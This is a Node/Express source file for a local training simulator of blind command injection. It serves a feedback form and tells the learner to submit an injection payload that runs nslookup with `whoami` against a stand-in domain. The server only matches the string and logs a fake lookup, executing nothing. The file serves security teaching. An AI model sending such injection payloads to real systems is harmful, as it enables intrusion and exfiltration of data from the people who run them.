import express from "express";
import { pathToFileURL } from "node:url";

const PORT = 4321;
const TRAINING_USERNAME = "training-user";

const FORM = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Feedback</title>
  </head>
  <body>
    <h1>Contact us</h1>
    <form method="post" action="/">
      <label>Name <input name="name" required></label><br>
      <label>Email <input name="email" type="text" required></label><br>
      <label>Message <textarea name="message" required></textarea></label><br>
      <button type="submit">Send feedback</button>
    </form>
    <p>Training simulation: submit <code>||nslookup+\`whoami\`.training.invalid||</code>
    as the email value using a request editor. Check the server terminal for the simulated lookup.</p>
    <p>This simulator does not execute commands or send DNS queries.</p>
  </body>
</html>`;

export function simulateTrainingPayload(email) {
  if (!/^\|\|nslookup\+`whoami`\.training\.invalid\|\|$/i.test(email ?? "")) return null;
  return `${TRAINING_USERNAME}.training.invalid`;
}

export function createApp() {
  const app = express();
  app.use(express.urlencoded({ extended: false }));

  app.get("/", (_request, response) => {
    response.type("html").send(FORM);
  });

  app.post("/", (request, response) => {
    const { email } = request.body;
    setImmediate(() => {
      const lookup = simulateTrainingPayload(email);
      if (lookup) console.log(`[simulated DNS; no network] ${lookup}`);
    });
    response.status(200).type("text").send("Thank you for your feedback.");
  });

  return app;
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  createApp().listen(PORT, "127.0.0.1", () => {
    console.log(`Training simulator listening at http://127.0.0.1:${PORT}`);
  });
}
